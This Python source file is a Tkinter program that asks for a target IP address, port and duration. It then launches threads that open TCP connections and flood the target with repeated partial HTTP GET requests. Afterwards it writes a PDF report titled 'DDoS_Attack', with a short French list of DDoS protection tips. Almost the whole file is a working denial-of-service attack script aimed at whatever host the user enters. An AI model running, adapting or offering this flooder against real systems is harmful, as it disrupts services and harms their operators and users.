import tkinter as tk
from tkinter import messagebox, simpledialog, scrolledtext, filedialog
import socket
import threading
import time
from reportlab.lib.pagesizes import letter
from reportlab.pdfgen import canvas
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.platypus import Paragraph, Frame

def create_pdf_report(attack_name, content):
    file_name = f"{attack_name}_{time.strftime('%Y-%m-%d_%H-%M-%S')}.pdf"
    file_path = filedialog.asksaveasfilename(defaultextension=".pdf", initialfile=file_name, filetypes=[("PDF files", "*.pdf")])
    if file_path:
        c = canvas.Canvas(file_path, pagesize=letter)
        width, height = letter

        # Define styles
        styles = getSampleStyleSheet()
        title_style = styles['Title']
        title_style.textColor = colors.darkblue
        header_style = styles['Heading2']
        header_style.textColor = colors.darkred
        normal_style = styles['BodyText']
        normal_style.textColor = colors.black
        advice_style = ParagraphStyle(
            'Advice',
            parent=styles['BodyText'],
            textColor=colors.green
        )

        # Draw header
        c.setFont("Helvetica-Bold", 16)
        c.setFillColor(colors.darkblue)
        c.drawString(50, height - 50, attack_name)

        c.setFont("Helvetica", 12)
        c.setFillColor(colors.black)
        c.drawString(50, height - 70, time.strftime('%Y-%m-%d %H:%M:%S'))

        # Draw content
        y = height - 100
        for line in content.split('\n'):
            if "Total requests sent" in line or "Target:" in line:
                p = Paragraph(line, header_style)
            else:
                p = Paragraph(line, normal_style)
            f = Frame(50, y, width - 100, 30, showBoundary=0)
            f.addFromList([p], c)
            y -= 30
            if y < 100:
                c.showPage()
                y = height - 100

        # Draw advice section
        advice_title = Paragraph("Conseils pour se protéger contre les attaques DDoS:", header_style)
        advice_content = [
            "1. Utiliser des services de protection contre les DDoS (ex. Cloudflare).",
            "2. Configurer des pare-feu et des systèmes de prévention d'intrusion (IPS).",
            "3. Mettre en place des limites de taux (rate limiting) pour les connexions.",
            "4. Surveiller le trafic réseau en temps réel pour détecter les anomalies.",
            "5. Avoir des plans de reprise après sinistre pour minimiser les temps d'arrêt."
        ]

        c.showPage()
        f = Frame(50, height - 100, width - 100, 30, showBoundary=0)
        f.addFromList([advice_title], c)

        y = height - 130
        for advice in advice_content:
            p = Paragraph(advice, advice_style)
            f = Frame(50, y, width - 100, 30, showBoundary=0)
            f.addFromList([p], c)
            y -= 30
            if y < 100:
                c.showPage()
                y = height - 100

        c.save()
        messagebox.showinfo("Rapport Créé", f"Le rapport a été enregistré sous {file_path}")

def ddos_attack(target, port, duration, log_widget):
    request_count = 0
    stop_event = threading.Event()

    def attack():
        nonlocal request_count
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((target, port))
            log_widget.insert(tk.END, f"Connected to {target} on port {port}\n")
            while not stop_event.is_set():
                client.sendto(b'GET / HTTP/1.1\r\n', (target, port))
                request_count += 1
                log_widget.insert(tk.END, f"Sent request {request_count} to {target}:{port}\n")
                log_widget.see(tk.END)
                log_widget.update_idletasks()
        except Exception as e:
            log_widget.insert(tk.END, f"Failed to connect or send request: {e}\n")
            log_widget.see(tk.END)
            log_widget.update_idletasks()

    end_time = time.time() + duration
    threads = []

    while time.time() < end_time:
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)
        log_widget.insert(tk.END, f"Started thread {thread.name}\n")
        log_widget.see(tk.END)
        log_widget.update_idletasks()

    time.sleep(duration)
    stop_event.set()

    for thread in threads:
        thread.join()

    report_content = f"Target: {target}\nPort: {port}\nDuration: {duration} seconds\nTotal requests sent: {request_count}"
    create_pdf_report("DDoS_Attack", report_content)

def run_ddos(log_widget):
    log_widget.delete('1.0', tk.END)
    target = simpledialog.askstring("DDoS Attack", "Enter the target IP address:")
    port = simpledialog.askinteger("DDoS Attack", "Enter the target port:")
    duration = simpledialog.askinteger("DDoS Attack", "Enter the attack duration in seconds:")
    if target and port and duration:
        ddos_attack(target, port, duration, log_widget)

if __name__ == "__main__":
    root = tk.Tk()
    root.withdraw()
    log_widget = scrolledtext.ScrolledText(root, wrap=tk.WORD, width=50, height=10)
    log_widget.pack(pady=10)
    run_ddos(log_widget)
    root.mainloop()
